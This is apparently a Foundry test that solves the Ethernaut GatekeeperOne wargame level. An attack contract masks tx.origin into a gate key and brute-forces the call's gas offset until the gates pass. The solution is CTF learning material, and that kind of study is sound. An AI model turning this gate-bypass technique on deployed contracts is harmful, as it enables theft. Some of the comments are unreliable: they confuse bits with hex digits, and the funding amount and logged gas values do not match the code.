pragma solidity ^0.8.10;

import 'ds-test/test.sol';
import 'forge-std/Vm.sol';

import '../levels/13-GatekeeperOne/GatekeeperOneFactory.sol';
import '../core/Ethernaut.sol';

contract GatekeeperAttack {
  address targetAddr;

  constructor(address _targetAddr) {
    targetAddr = _targetAddr;
  }

  function attack(bytes8 _key, uint256 _gas) external {
    GatekeeperOne(targetAddr).enter{gas: _gas}(_key);
  }
}

contract GatekeeperOneTest is DSTest {
  //--------------------------------------------------------------------------------
  //                            Setup Game Instance
  //--------------------------------------------------------------------------------

  Vm vm = Vm(address(HEVM_ADDRESS)); // `ds-test` library cheatcodes for testing
  Ethernaut ethernaut;
  address attacker = address(0xdeadbeef);

  function setUp() public {
    ethernaut = new Ethernaut(); // initiate Ethernaut contract instance
    vm.deal(attacker, 10 ether); // fund our attacker contract with 1 ether
  }

  function testGatekeeperOneHack() public {
    //--------------------------------------------------------------------------------
    //                             Setup Level Instance
    //--------------------------------------------------------------------------------
    GatekeeperOneFactory gatekeeperOneFactory = new GatekeeperOneFactory();
    ethernaut.registerLevel(gatekeeperOneFactory);
    vm.startPrank(tx.origin);

    address levelAddress = ethernaut.createLevelInstance(gatekeeperOneFactory);
    GatekeeperOne gatekeeperOneContract = GatekeeperOne(payable(levelAddress));

    //--------------------------------------------------------------------------------
    //                             Start Level Attack
    //--------------------------------------------------------------------------------

    GatekeeperAttack attackContract = new GatekeeperAttack(address(gatekeeperOneContract));
    
    // Note: we need to pack values into the single key value which will meet the following reqs:
    /*
      uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))
      uint32(uint64(_gateKey)) != uint64(_gateKey)
      uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))

      We need:
      1st condition:

      Gate 3 - 1st condition:
      ---------------------------------------------------------
      uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))
      Meaning: the last 8 bits of _gateKey should be equal to the last 4
      bits of _gateKey

      So: 
      0x00000000  <-- uint32 (last 8 bits)
      0x????0000  <-- uint16 (last 4 bits)
      Mask: & 0x0000ffff

      Gate 3 - 2nd condition:
      ---------------------------------------------------------
      uint32(uint64(_gateKey)) != uint64(_gateKey)
      Meaning: the last 8 bits of _gateKey should be different from the
      last 16 bits of _gateKey

      0x00000000???????? <-- uint32 (last 8 bits)
      0x???????????????? <-- uint64 (last 16 bits)

      Mask: & 0xFFFFFFFF00000000

      Final mask would be:
                0x0000FFFF
        0xFFFFFFFF00000000
    --> 0xFFFFFFFF0000FFFF

      Example of bit masking/packing:
      uint8 value1 = 0x12;  // 00010010 in binary
      uint8 value2 = 0x34;  // 00110100 in binary
      uint256 mask1 = (2 ** 8 - 1);  // 11111111 in binary
      uint256 mask2 = (2 ** 16 - 1) ^ mask1;  // 1111111100000000 in binary
      uint256 packedValue = (value1 & mask1) | ((value2 << 8) & mask2);
      // Result: packedValue = 0x3412 (0011010000010010 in binary)
    */
    
    for (uint256 i = 0; i <= 8191; i++) {
      // note, we have to cast the uint160 to a uint64 before casting to bytes8 due to similar bit count
      bytes8 _key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;

      // loop with a try/catch to prevert reverting allowing us to brute force the value
      try attackContract.attack(_key, 70000 + i) {
        emit log_named_uint('Gate 2 Passed (GasLeft() = 8191)', 73985 + i);
        break;
      } catch {}
    }

    //--------------------------------------------------------------------------------
    //                                Submit Level
    //--------------------------------------------------------------------------------
    bool challengeCompleted = ethernaut.submitLevelInstance(
      payable(levelAddress)
    );
    vm.stopPrank();
    assert(challengeCompleted);
  }
}

